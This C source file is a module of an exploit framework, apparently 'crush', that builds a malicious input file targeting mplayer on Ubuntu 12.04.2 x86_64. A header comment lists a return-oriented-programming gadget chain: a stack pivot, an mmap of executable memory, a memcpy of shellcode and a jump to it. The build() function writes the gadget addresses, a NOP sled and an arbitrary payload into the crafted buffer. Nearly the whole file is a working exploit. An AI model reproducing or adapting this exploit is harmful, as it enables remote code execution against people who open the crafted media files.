/* Copyright (C) 2014 Lab Mouse Security
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
/*
###############################################################
#
# gadget chain
#

# stack pivot chain
#
_usr_bin_mplayer: asm=CALL QWORD [RBX+0x1e0] found at offset=497576 realistic_peer=8,2
MOV RSI, R14
MOV EDI, 0x88ec
_usr_bin_mplayer: asm=CALL QWORD [R14+0x60] found at offset=520295 realistic_peer=3,1
MOV RDI, R14
_usr_bin_mplayer: asm=CALL QWORD [RBX+0x8] found at offset=386170 realistic_peer=21,6
MOV RBX, RSI
MOV [RSP-0x8], RBP
SUB RSP, 0x18
MOV RBP, RDI
MOV RDI, [RSI+0x18]
MOV ESI, [RSI]
_usr_bin_mplayer: asm=RET found at offset=368233 realistic_peer=8,4
LEAVE
JZ 0x459e70
ADD RSP, 0x10
POP RBX

# stack padding chain
#
_usr_bin_mplayer: asm=RET found at offset=411879 realistic_peer=13,5
ADD RSP, 0x2e8
POP RBX
POP RBP
POP R12
POP R13

# populate_mmap
#
_usr_bin_mplayer: asm=RET found at offset=15061 realistic_peer=1,1
POP RSI			# populate for subsequent call

_usr_bin_mplayer: asm=RET found at offset=414392 realistic_peer=14,6
POP R9			# set to zero
PUSH RBP
PUSH RSI
JZ 0x4653c0
XOR ECX, ECX
MOV EAX, ECX

_usr_bin_mplayer: asm=RET found at offset=55113 realistic_peer=1,1
POP RAX			# consume spurious rbp

_usr_bin_mplayer: asm=RET found at offset=484676 realistic_peer=5,3
POP RBP			# populate for mov
POP R12			# populate for mov
POP R13

_usr_bin_mplayer: asm=RET found at offset=307341 realistic_peer=1,1
POP RCX			# populate for call

_usr_bin_mplayer: asm=CALL RCX found at offset=336339 realistic_peer=14,4
MOV RDX, R12		# populate rdx
MOV RSI, RBP		# populate rsi
MOV RDI, RAX		# rdi can be any hint
MOV EBX, 0x1

_usr_bin_mplayer: asm=RET found at offset=55113 realistic_peer=1,1
POP RAX			# consume ret addr

_usr_bin_mplayer: asm=RET found at offset=307341 realistic_peer=1,1
POP RCX			# set for mmap call

# call mmap_anon
#
   0x0000000000579e06 <+6>:     mov    $0xffffffff,%r8d
   0x0000000000579e0c <+12>:    or     $0x22,%ecx
   0x0000000000579e0f <+15>:    jmpq   0x445df0 <mmap64@plt>

# populate_memcpy
#
_usr_bin_mplayer: asm=RET found at offset=484676 realistic_peer=4,2
POP R12			# SHELLCODE_COPY
POP R13

_usr_bin_mplayer: asm=RET found at offset=307341 realistic_peer=1,1
POP RCX			# populate for call

_usr_bin_mplayer: asm=CALL RCX found at offset=336339 realistic_peer=14,4
MOV RDX, R12		# populate rdx
MOV RSI, RBP		# bad
MOV RDI, RAX		# subsequently overwritten
MOV EBX, 0x1

_usr_bin_mplayer: asm=RET found at offset=307341 realistic_peer=1,1
POP RCX			# consume ret addr

_usr_bin_mplayer: asm=RET found at offset=333703 realistic_peer=4,3
PUSH RAX
MOV EAX, EBX
POP RBX

_usr_bin_mplayer: asm=RET found at offset=55113 realistic_peer=1,1
POP RAX			# populate for subsequent call

_usr_bin_mplayer: asm=CALL RAX found at offset=336900 realistic_peer=8,2
LEA RSI, [RSP+0x2c]	# save source addr
MOV RDI, R14

_usr_bin_mplayer: asm=RET found at offset=55113 realistic_peer=1,1
POP RAX			# consume ret addr

_usr_bin_mplayer: asm=RET found at offset=55113 realistic_peer=1,1
POP RAX			# ENSURE rax is zero

# call fast_memcpy
#
   0x0000000000573792 <+50>:    mov    %rbx,%rdi
   0x0000000000573795 <+53>:    test   %eax,%eax
   0x0000000000573797 <+55>:    jne    0x573998 <fast_memcpy+568>
   0x000000000057379d <+61>:    callq  0x443da0 <memcpy@plt>
   0x00000000005737a2 <+66>:    mov    %rbx,%rax
   0x00000000005737a5 <+69>:    pop    %rbx
   0x00000000005737a6 <+70>:    retq   

# call_shellcode
#
_usr_bin_mplayer: asm=RET found at offset=482579 realistic_peer=2,1
ADD AL, 0x40

_usr_bin_mplayer: asm=RET found at offset=51105 realistic_peer=1,1
PUSH RAX

#
###############################################################
*/
#include <crush.h>

#define FRAME_BYTES (1024 + 256 + 256 + 256)

#define BASE_ADDR 			0x400000ULL
#define GADGET_ADDR(o, a) 		((BASE_ADDR) + (o) - (a))

#define OFFSET_TO_FRAME			(2)

#define FAKE_REGISTER 			0xa7a7a7a7a7a7a7a7ULL

#define STACK_PIVOT_CHAIN_G1 		GADGET_ADDR(497576, 8)
#define STACK_PIVOT_CHAIN_G2 		GADGET_ADDR(520295, 3)
#define STACK_PIVOT_CHAIN_G3 		GADGET_ADDR(386170, 21)
#define STACK_PIVOT_CHAIN_G4 		GADGET_ADDR(368233, 8)

#define STACK_PADDING_G1		GADGET_ADDR(411879, 13)
#define FRAME_PADDING_SIZE		0x2e8

#define POPULATE_MMAP_G1 		GADGET_ADDR(15061, 1)
#define POPULATE_MMAP_G2 		GADGET_ADDR(414392, 14)
#define POPULATE_MMAP_G3 		GADGET_ADDR(55113, 1)
#define POPULATE_MMAP_G4 		GADGET_ADDR(484676, 5)
#define POPULATE_MMAP_G5 		GADGET_ADDR(307341, 1)
#define POPULATE_MMAP_G6 		GADGET_ADDR(336339, 14)
#define POPULATE_MMAP_G7 		GADGET_ADDR(55113, 1)
#define POPULATE_MMAP_G8 		GADGET_ADDR(307341, 1)

#define MMAP_SIZE 8192
#define MMAP_PROT (PROT_READ|PROT_WRITE|PROT_EXEC)
#define MMAP_FLAGS (MAP_PRIVATE|MAP_ANONYMOUS)
#define MMAP_OFFSET 0

#define CALL_MMAP_ANON_G1 		0x0000000000579e06ULL

#define POPULATE_MEMCPY_G1		GADGET_ADDR(484676, 4)
#define POPULATE_MEMCPY_G2		GADGET_ADDR(307341, 1)
#define POPULATE_MEMCPY_G3		GADGET_ADDR(336339, 14)
#define POPULATE_MEMCPY_G4		GADGET_ADDR(307341, 1)
#define POPULATE_MEMCPY_G5		GADGET_ADDR(333703, 4)
#define POPULATE_MEMCPY_G6		GADGET_ADDR(55113, 1)
#define POPULATE_MEMCPY_G7		GADGET_ADDR(336900, 8)
#define POPULATE_MEMCPY_G8		GADGET_ADDR(55113, 1)
#define POPULATE_MEMCPY_G9		GADGET_ADDR(55113, 1)

#define MEMCPY_SHELLCODE_SIZE		/* XXX */ (256 + 256 + 32 + 64)

#define FAST_MEMCPY_G1			0x0000000000573792ULL

#define CALL_SHELLCODE_G1		GADGET_ADDR(482579, 2)
#define CALL_SHELLCODE_G2		GADGET_ADDR(51105, 1)

#define OFFSET_OF_SHELLCODE		0


static Boolean
build(unsigned char const * input, int ninput, unsigned char ** output, int * noutput)
{
	unsigned char * buffer;
	unsigned char * p;
	unsigned char * q;
	unsigned char * j;
	unsigned long * l;
	int n;

	if(ninput > NSIZE)
	{       
		error(False, "payload size exceeds maximum (%d > %d)", ninput, NSIZE);
		return False;
	}

	buffer = calloc(1024, (64 * 1024));
	if(!buffer)
	{
		error(True, "calloc");
		return False;
	}

	p = buffer;

	{
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 244;

		/* increment to the start of the embedded stack frame */
		q = p;

		/* place the g2 pivot */
		q = p + (0x1e0 - 0x50);
		l = (unsigned long * )q;
		*l++ = STACK_PIVOT_CHAIN_G2;

		/* place the g3 pivot */
		q = p + (0x60);
		l = (unsigned long * )q;
		*l++ = STACK_PIVOT_CHAIN_G3;

		/* place the STACK_PIVOT_CHAIN_G4 pivot */
		q = p + 8;
		l = (unsigned long * )q;
		*l++ = STACK_PIVOT_CHAIN_G4;

		q = p + 32;
		l = (unsigned long * )q;
		*l++ = STACK_PADDING_G1;

		/* implement the stack padding for RSP adjustment in STACK_PADDING_G1 */
		q = (unsigned char * )l;
		q += FRAME_PADDING_SIZE;
		l = (unsigned long * )q;

		*l++ = FAKE_REGISTER; /* rbx */
		*l++ = FAKE_REGISTER; /* rbp */
		*l++ = FAKE_REGISTER; /* r12 */
		*l++ = FAKE_REGISTER; /* r13 */
		*l++ = POPULATE_MMAP_G1;

		/* populate mmap */
		*l++ = POPULATE_MMAP_G3;	/* for push %rsi */
		*l++ = POPULATE_MMAP_G2;
		*l++ = MMAP_OFFSET;
		*l++ = POPULATE_MMAP_G4;
		*l++ = MMAP_SIZE;
		*l++ = MMAP_PROT;
		*l++ = FAKE_REGISTER;
		*l++ = POPULATE_MMAP_G5;
		*l++ = POPULATE_MMAP_G7;
		*l++ = POPULATE_MMAP_G6;
		*l++ = POPULATE_MMAP_G8;
		*l++ = MMAP_FLAGS;
		*l++ = CALL_MMAP_ANON_G1;

		/* mmap_anon */
		*l++ = POPULATE_MEMCPY_G1;

		/* populate memcpy */
		*l++ = MEMCPY_SHELLCODE_SIZE;
		*l++ = FAKE_REGISTER;
		*l++ = POPULATE_MEMCPY_G2;
		*l++ = POPULATE_MEMCPY_G4;
		*l++ = POPULATE_MEMCPY_G3;
		*l++ = POPULATE_MEMCPY_G5;
		*l++ = POPULATE_MEMCPY_G6;
		*l++ = POPULATE_MEMCPY_G8;
		*l++ = POPULATE_MEMCPY_G7;
		*l++ = POPULATE_MEMCPY_G9;
		*l++ = 0;
		*l++ = FAST_MEMCPY_G1;

		/* fast_memcpy */
		*l++ = FAKE_REGISTER;
		*l++ = CALL_SHELLCODE_G1;

		/* call_shellcode */
		*l++ = CALL_SHELLCODE_G2;

		n = (char * )l - (char * )p;
		msg(MsgVerbose, "total of %d bytes encoded to the fake frame\n", n);

		n = FRAME_BYTES - n;
		p = (unsigned char * )l;
		msg(MsgVerbose, "padding a total of %d bytes with NOP\n", n);

		memset(p, 0x90, n);
		j = p;
		j += n;

		/* put the payload at the start of the 512 byte payload */
		p += n;
		p -= 512 + 167; /* XXX this is the tested starting offset of the payloda copied
				 * XXX this is where you MUST load the payload
				 * XXX */

		/* the rest of the shellcode payload goes here */
		*p++ = 0xff; /* XXX DO NOT REMOVE!!! this is a dummy byte */
		*p++ = 0xff; /* XXX DO NOT REMOVE!!! this is a dummy byte */
		*p++ = 0xff; /* XXX DO NOT REMOVE!!! this is a dummy byte */

		memcpy(p, input, ninput);

		p = j;

		msg(MsgVerbose, "p is now %ld\n", p - buffer);
		*p++ = 32;

		p += 16843001;
		*p++ = 137;
		*p++ = 16;
		*p++ = 0;
		*p++ = 0;

		*p++ = 62;
		p += 8;
		p += 8;
		p += 8;
		p += 8;
		p += 8;

		p -= 1;
		l = (unsigned long * )p;
		*l++ = STACK_PIVOT_CHAIN_G1;
		*l++ = 0;
		*l++ = 0;
		*l++ = 0xe814ec70ULL;
		*l++ = 0;
		p = (unsigned char * )l;
		p += 1;

		*p++ = 17;
		*p++ = 0;
		*p++ = 0;
	}

	*noutput = p - buffer;
	*output = buffer;

	return True;
}

Crushlet
ubuntu_12_04_2_x86_64 = 
{       
        "ubuntu_12_04_2_x86_64",
        Platform_Linux,
        Architecture_x86_64,

        NULL,
        NULL,
        build
};

